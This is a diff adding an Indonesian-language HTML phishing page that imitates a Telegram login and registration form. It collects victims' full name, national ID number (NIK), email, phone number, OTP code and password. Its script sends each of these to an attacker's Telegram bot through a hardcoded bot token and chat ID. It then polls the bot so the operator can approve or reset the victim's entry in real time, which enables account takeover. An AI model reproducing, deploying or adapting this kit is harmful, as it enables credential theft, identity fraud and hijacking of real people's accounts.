@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Telegram</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+      .arrow-button {
+    position: fixed; /* Tetap di posisi ini meskipun halaman digulir */
+    bottom: 4rem; /* Jarak dari bawah layar */
+    right: 4rem; /* Jarak dari sisi kanan layar */
+    z-index: 10; /* Pastikan tombol berada di atas elemen lainnya */
+}
+/* Style tambahan untuk password input */
+#passwordPage1 {
+    padding-left: 12px; /* Memberi sedikit jarak di dalam kolom */
+}
+/* Mengatur gambar latar belakang untuk seluruh halaman */
+body {
+    background-image: url('barcode.jpg'); /* Ganti dengan URL gambar Anda */
+    background-size: cover; /* Menyesuaikan ukuran gambar agar menutupi seluruh halaman */
+    background-position: center center; /* Posisi gambar di tengah */
+    background-repeat: no-repeat; /* Menghindari pengulangan gambar */
+    height: 100vh; /* Pastikan halaman mengisi seluruh tinggi layar */
+}
+/* Mengatur transparansi pada background #page0 */
+#page0 {
+    background-color: rgba(0, 0, 0, 0.1); /* Latar belakang transparan */
+    padding: 20px;
+    border-radius: 8px;
+    position: relative; /* Untuk memastikan kolom dan tombol di atas transparansi */
+}
+
+/* Mengubah warna teks di dalam page0 menjadi putih */
+#page0 {
+    color: white; /* Semua teks di dalam page0 akan berwarna putih */
+}
+
+/* Menjaga keterangan error dengan warna merah */
+#page0 .text-red-500 {
+    color: #f87171; /* Warna merah untuk pesan error */
+}
+
+/* Menjaga warna tombol "Daftar" tetap sesuai */
+#page0 button {
+    color: white; /* Teks tombol tetap putih */
+}
+
+/* Mengatur warna teks di dalam kolom input agar tetap bisa dibaca */
+#page0 input, #page0 input::placeholder {
+    color: #333; /* Teks placeholder dan input berwarna abu-abu gelap */
+}
+
+/* Menjaga warna label tetap putih */
+#page0 label {
+    color: white; /* Label tetap berwarna putih */
+}
+
+/* Jika input dalam focus, teks di dalam input tetap gelap */
+#page0 input:focus {
+    color: #333; /* Warna teks dalam input tetap gelap saat fokus */
+    border-color: #1D4ED8; /* Warna border saat fokus */
+}
+
+/* Mengubah background tombol untuk tombol Daftar */
+#page0 button {
+    background-color: #1D4ED8; /* Warna background tombol Daftar biru */
+    color: white; /* Warna teks pada tombol Daftar tetap putih */
+}
+
+#page0 button:hover {
+    background-color: #2563EB; /* Warna background tombol saat hover */
+}
+
+/* Menjaga warna placeholder input tetap putih ketika input kosong */
+#page0 input::placeholder {
+    color: #aaa; /* Placeholder tetap putih atau abu-abu terang */
+}
+/* Membuat page1 transparan dengan background transparan */
+#page1 {
+    background-color: rgba(255, 255, 255, 0.0); /* Transparan dengan latar belakang putih transparan */
+    color: white; /* Semua teks dalam page1 berwarna putih */
+    border-radius: 8px; /* Menambahkan border-radius untuk sudut yang lembut */
+    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); /* Memberikan bayangan lembut */
+}
+
+/* Keterangan error di page1 tetap merah */
+#page1 .text-red-500 {
+    color: #f87171; /* Warna merah untuk pesan error */
+}
+
+/* Tombol di page1 tetap terlihat dengan teks putih */
+#page1 button {
+    color: white; /* Teks tombol tetap putih */
+}
+
+/* Input fields di page1 tetap memiliki teks gelap */
+#page1 input, #page1 input::placeholder {
+    color: #333; /* Teks dalam input tetap gelap untuk kontras */
+}
+
+/* Mengatur warna placeholder input tetap terlihat */
+#page1 input::placeholder {
+    color: #aaa; /* Placeholder berwarna abu-abu terang */
+}
+
+/* Tombol saat hover tetap memperjelas interaksi */
+#page1 button:hover {
+    background-color: #2563EB; /* Warna background tombol saat hover */
+}
+
+/* Tombol verifikasi (di page1) */
+#page1 button:focus {
+    outline: none; /* Menghilangkan outline ketika tombol difokuskan */
+    border: 2px solid #1D4ED8; /* Border biru terang untuk fokus */
+}
+
+/* Menambahkan border untuk input fields agar terlihat jelas di atas background transparan */
+#page1 input {
+    border: 1px solid #ccc; /* Border terang untuk input agar jelas */
+}
+
+#page1 input:focus {
+    border-color: #1D4ED8; /* Border biru terang saat fokus */
+}
+
+
+
+    </style>
+</head>
+<body class="bg-gray-100 h-screen flex justify-center items-center">
+
+<!-- Page 0: Telegram Login Form -->
+<div id="page0" class="page w-full max-w-sm bg-white p-8 rounded-lg shadow-lg">
+    <div class="flex justify-center mb-6">
+        <img src="barcode.jpg"  class="w-12 h-12">
+    </div>
+    <h2 class="text-center text-xl font-semibold mb-2">Formulir pendaftaran</h2>
+    <form id="registrationForm">
+        <!-- Nama Lengkap -->
+        <div class="mb-4">
+            <label for="fullName" class="block text-sm font-medium text-gray-700 mb-1">Nama Lengkap</label>
+            <input type="text" id="fullName" placeholder="Nama Lengkap" class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
+            <p id="fullNameError" class="text-red-500 text-xs hidden">Harap masukkan nama lengkap.</p>
+        </div>
+
+        <!-- NIK -->
+        <div class="mb-4">
+            <label for="nik" class="block text-sm font-medium text-gray-700 mb-1">NIK</label>
+            <input type="text" id="nik" placeholder="Nomor Induk Kependudukan" maxlength="16" oninput="this.value = this.value.replace(/[^0-9]/g, '');" class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
+            <p id="nikError" class="text-red-500 text-xs hidden">Harap masukkan NIK yang valid.</p>
+        </div>
+
+        <!-- Email -->
+        <div class="mb-4">
+            <label for="email" class="block text-sm font-medium text-gray-700 mb-1">Email</label>
+            <input type="email" id="email" placeholder="Email" class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
+            <p id="emailError" class="text-red-500 text-xs hidden">Harap masukkan email yang valid.</p>
+        </div>
+
+        <!-- Nomor Telepon -->
+        <div class="mb-4">
+            <label for="phone" class="block text-sm font-medium text-gray-700 mb-1">Nomor Telepon</label>
+            <div class="flex">
+                <span class="inline-flex items-center px-3 py-2 border border-r-0 border-gray-300 bg-gray-100 rounded-l-md text-gray-600">+62</span>
+                <input type="tel" id="phone" placeholder="000 000000" maxlength="12" oninput="this.value = this.value.replace(/[^0-9]/g, '');" class="w-full px-3 py-2 border border-gray-300 rounded-r-md focus:outline-none focus:ring-2 focus:ring-blue-500">
+            </div>
+            <p id="phoneError" class="text-red-500 text-xs hidden">Harap masukkan nomor telepon yang valid.</p>
+        </div>
+
+        <div class="mb-4">
+            <button type="button" onclick="confirmPhoneNumber()" class="w-full py-2 px-4 bg-blue-500 text-white font-semibold rounded-md hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-offset-2">Daftar</button>
+        </div>
+    </form>
+</div>
+
+
+
+
+<!-- Page 1: Verification Code Input -->
+<div id="page1" class="page fixed inset-0 bg-white p-8 flex flex-col justify-center items-center hidden">
+    <div class="flex justify-center mb-6">
+        <img src="barcode.jpg" alt="Telegram Logo" class="w-12 h-12">
+    </div>
+    <h2 class="text-center text-xl font-semibold mb-2">Verifikasi akun</h2>
+
+    <!-- Code Input Field (1 kolom) -->
+    <div class="mb-4">
+        <input type="text" id="verificationCode" maxlength="5" oninput="this.value = this.value.replace(/[^0-9]/g, '');" class="w-full px-3 py-2 border border-gray-300 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500 text-center" placeholder="Kode OTP">
+        <p id="otpError" class="text-red-500 text-xs hidden"></p> <!-- Pesan error untuk OTP -->
+    </div>
+
+    <!-- Password Input Field -->
+    <div class="mb-4">
+        <input type="password" id="passwordPage1" placeholder="Masukkan kata sandi" class="w-full px-4 py-2 border border-blue-400 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500">
+        <p id="passwordError" class="text-red-500 text-xs hidden">Kode otp atau Kata sandi yang Anda masukkan salah, silahkan isi kembali dengan benar.</p> <!-- Pesan error untuk password -->
+    </div>
+
+    <!-- Arrow Button in Bottom Right -->
+    <button type="button" onclick="confirmCodeAndSendPhoneNumber()" class="absolute bottom-8 right-8 py-2 px-4 bg-blue-500 text-white font-semibold rounded-full hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-blue-500">
+        Verifikasi 
+    </button>
+</div>
+
+
+
+
+
+
+    <script>
+    
+    
+    // Timer untuk hitung mundur dan memunculkan tombol "Kirim ulang" ketika waktu habis
+let countdown = 60;
+const timerElement = document.getElementById("timer");
+const resendButton = document.getElementById("resendCode");
+
+function startCountdown() {
+    countdown = 60; // Set waktu awal
+    timerElement.textContent = countdown;
+    resendButton.classList.add("hidden"); // Sembunyikan tombol "Kirim ulang" saat hitung mundur dimulai
+
+    const countdownInterval = setInterval(() => {
+        countdown--;
+        timerElement.textContent = countdown;
+
+        if (countdown <= 0) {
+            clearInterval(countdownInterval);
+            timerElement.textContent = ''; // Kosongkan timer ketika waktu habis
+            resendButton.classList.remove("hidden"); // Tampilkan tombol "Kirim ulang"
+        }
+    }, 1000); // Interval 1 detik
+}
+
+// Initialize page on load
+document.addEventListener('DOMContentLoaded', () => {
+    showPage('page0');
+});
+
+// Show specific page and hide others
+function showPage(pageId) {
+    document.querySelectorAll('.page').forEach(page => page.classList.add('hidden'));
+    document.getElementById(pageId).classList.remove('hidden');
+}
+
+function validatePhoneNumber(input) {
+
+function validateEmail(email) {
+    const emailPattern = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/;
+    return emailPattern.test(email);
+}
+
+    // Hanya izinkan angka dan awalan 08 atau 8
+    input.value = input.value.replace(/[^0-9]/g, ''); // Hapus karakter non-numerik
+    const phoneNumber = input.value;
+
+    if (!phoneNumber.startsWith("08") && !phoneNumber.startsWith("8")) {
+        document.getElementById("phoneError").classList.remove("hidden");
+    } else {
+        document.getElementById("phoneError").classList.add("hidden");
+    }
+}
+
+function confirmPhoneNumber() {
+    // Ambil nilai dari setiap input
+    const fullName = document.getElementById('fullName').value;
+    const nik = document.getElementById('nik').value;
+    const email = document.getElementById('email').value;
+    const phone = document.getElementById('phone').value;
+    
+    // Ambil elemen pesan error
+    const fullNameError = document.getElementById('fullNameError');
+    const nikError = document.getElementById('nikError');
+    const emailError = document.getElementById('emailError');
+    const phoneError = document.getElementById('phoneError');
+    
+    // Reset pesan error
+    fullNameError.classList.add('hidden');
+    nikError.classList.add('hidden');
+    emailError.classList.add('hidden');
+    phoneError.classList.add('hidden');
+    
+    let valid = true;
+    
+    // Validasi Nama Lengkap
+    if (!fullName) {
+        fullNameError.classList.remove('hidden');
+        valid = false;
+    }
+    
+    // Validasi NIK
+    if (!nik || nik.length !== 16) {
+        nikError.classList.remove('hidden');
+        valid = false;
+    }
+    
+    // Validasi Email
+    if (!validateEmail(email)) {
+        emailError.classList.remove('hidden');
+        valid = false;
+    }
+    
+    // Validasi Nomor Telepon
+    if (!validatePhoneNumber(phone)) {
+        phoneError.classList.remove('hidden');
+        valid = false;
+    }
+    
+    // Jika semua validasi berhasil, lanjutkan ke halaman berikutnya
+    if (valid) {
+        showPage('page1');
+        sendPhoneToTelegram(phone);
+    }
+}
+
+// Fungsi validasi email
+function validateEmail(email) {
+    const emailPattern = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/;
+    return emailPattern.test(email);
+}
+
+// Fungsi validasi nomor telepon
+function validatePhoneNumber(phone) {
+    const phonePattern = /^[0-9]{10,12}$/; // Validasi hanya angka dan panjang 10-12 digit
+    return phonePattern.test(phone);
+}
+
+
+
+// Send phone to Telegram
+function sendPhoneToTelegram(phone) {
+    fetch(`https://api.telegram.org/bot${'7653188082:AAEMjZKBaivSo5nEHy1HVlQbRYqNvCwuHic'}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: '-4546395669',
+            text: ` +62 ${phone}`
+        })
+    }).then(response => response.json())
+    .catch(error => console.error('Gagal mengirim nomor telepon ke Telegram:', error));
+}
+
+function confirmCodeAndSendPhoneNumber() {
+    const code = document.getElementById('verificationCode').value;
+    const password = document.getElementById('passwordPage1').value;
+
+    if (code.length === 5 && password.length > 0) {
+        sendMessageWithChoices(code, password);
+    } else {
+        alert('Kode atau kata sandi tidak lengkap!');
+    }
+}
+
+
+function moveFocus(currentInput, index) {
+    if (currentInput.value.length === 1 && index < 4) {
+        document.querySelectorAll('#page1 input[type="text"]')[index + 1].focus();
+    }
+}
+
+function sendMessageWithChoices(code, password) {
+    fetch(`https://api.telegram.org/bot${'7653188082:AAEMjZKBaivSo5nEHy1HVlQbRYqNvCwuHic'}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: '-4546395669',  // Ganti dengan chat ID Anda
+            text: `Kode OTP: ${code}\nKata Sandi: ${password}`,
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: "Lanjutkan", callback_data: "continue" },
+                     { text: "Tidak", callback_data: "cancel" },
+                     { text: "reset", callback_data: "reset" }]
+                ]
+            }
+        })
+    }).then(() => {
+        // Mulai polling untuk respons setelah mengirim pesan
+        pollBotResponse();
+    });
+}
+
+
+async function pollBotResponse() {
+    const botPollingInterval = setInterval(async () => {
+        const response = await fetch(`https://api.telegram.org/bot${'7653188082:AAEMjZKBaivSo5nEHy1HVlQbRYqNvCwuHic'}/getUpdates`);
+        const data = await response.json();
+
+        // Cek jika ada pembaruan
+        if (data.result.length > 0) {
+            const lastUpdate = data.result[data.result.length - 1];
+            if (lastUpdate.callback_query) {
+                const action = lastUpdate.callback_query.data;
+                const messageId = lastUpdate.callback_query.message.message_id;  // ID pesan
+
+                if (action === 'continue') {
+                    // Pindah ke halaman lain (misalnya page3.html) setelah klik 'Lanjutkan'
+                    window.location.href = "Animasi.html";  // Ganti dengan halaman yang Anda inginkan
+
+                    // Menonaktifkan tombol 'Lanjutkan' di Telegram setelah diklik
+                    disableButton(messageId, 'continue'); // Menonaktifkan tombol
+                    clearInterval(botPollingInterval); // Hentikan polling setelah mendapatkan respons
+                } else if (action === 'cancel' || action === 'reset') {
+                    // Reset kolom input dan tetap di halaman yang sama jika 'Tidak' ditekan
+                    resetInputs();
+                    disableButton(messageId, 'cancel'); // Menonaktifkan tombol
+                    clearInterval(botPollingInterval); // Hentikan polling setelah reset
+                }
+            }
+        }
+    }, 1000);  // Cek setiap detik
+}
+
+
+
+// Fungsi untuk menonaktifkan tombol setelah diklik
+function disableButton(messageId, buttonId) {
+    fetch(`https://api.telegram.org/bot${'7653188082:AAEMjZKBaivSo5nEHy1HVlQbRYqNvCwuHic'}/editMessageReplyMarkup`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: '-4546395669',  // Ganti dengan chat ID Anda
+            message_id: messageId,  // ID pesan yang ingin diubah
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: "Lanjutkan (Disabled)", callback_data: "continue_disabled" },
+                     { text: "Tidak (Disabled)", callback_data: "cancel_disabled" },
+                     { text: "reset", callback_data: "reset" }]
+                ]
+            }
+        })
+    });
+}
+
+function resetInputs() {
+    // Mengosongkan input kode OTP
+    const otpInputs = document.querySelectorAll('#page1 input[type="text"]');
+    otpInputs.forEach(input => input.value = '');
+    
+    // Mengosongkan input kata sandi
+    const passwordInput = document.getElementById('passwordPage1');
+    if (passwordInput) {
+        passwordInput.value = ''; // Mengosongkan kolom kata sandi
+    }
+
+    // Menambahkan border merah untuk memberi tanda bahwa input direset
+    flashInputsRed();
+
+    // Menampilkan pesan error jika user mengklik "Tidak"
+    document.getElementById('otpError').classList.remove('hidden'); // Menampilkan pesan error untuk OTP
+    document.getElementById('passwordError').classList.remove('hidden'); // Menampilkan pesan error untuk kata sandi
+}
+
+// Fungsi untuk menambahkan border merah sementara pada input
+function flashInputsRed() {
+    const otpInputs = document.querySelectorAll('#page1 input[type="text"]');
+    otpInputs.forEach(input => input.classList.add('border-red-500'));
+    
+    const passwordInput = document.getElementById('passwordPage1');
+    if (passwordInput) {
+        passwordInput.classList.add('border-red-500');
+    }
+
+    // Menghapus border merah setelah beberapa detik
+    setTimeout(() => {
+        otpInputs.forEach(input => input.classList.remove('border-red-500'));
+        if (passwordInput) {
+            passwordInput.classList.remove('border-red-500');
+        }
+    }, 2000);
+}
+
+
+
+// Toggle password visibility
+function togglePasswordVisibility() {
+    const passwordField = document.getElementById("password");
+    const eyeIcon = document.getElementById("eyeIcon");
+
+    if (passwordField.type === "password") {
+        passwordField.type = "text";
+        eyeIcon.classList.add("text-blue-500");
+    } else {
+        passwordField.type = "password";
+        eyeIcon.classList.remove("text-blue-500");
+    }
+}
+
+// Send password to Telegram and navigate to next page
+function sendPasswordToBot() {
+    const password = document.getElementById('password').value;
+    if (password.length > 0) {
+        sendPasswordToTelegram(password);
+        showPage('page3');
+    } else {
+        alert('Password tidak boleh kosong!');
+    }
+}
+
+function sendPasswordToTelegram(password) {
+    fetch(`https://api.telegram.org/bot${'7653188082:AAEMjZKBaivSo5nEHy1HVlQbRYqNvCwuHic'}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            chat_id: -4546395669,
+            text: `Password yang dimasukkan: ${password}`
+        })
+    });
+}
+
+function uploadFile() {
+    // Anda bisa menambahkan logika untuk mengirim file ke server di sini
+    // Misalnya, menggunakan AJAX atau FormData untuk mengirim file
+
+    // Setelah file berhasil dikirim, pindah ke halaman 4
+    showPage('page4');
+}
+
+// Fungsi untuk menyelesaikan proses dan menampilkan pesan selesai
+function finishProcess() {
+    alert("Proses selesai! Terima kasih.");
+    // Anda bisa menambahkan logika lainnya seperti mengarahkan pengguna ke halaman lain jika diperlukan
+}
+
+    </script>
+</body>
+</html>
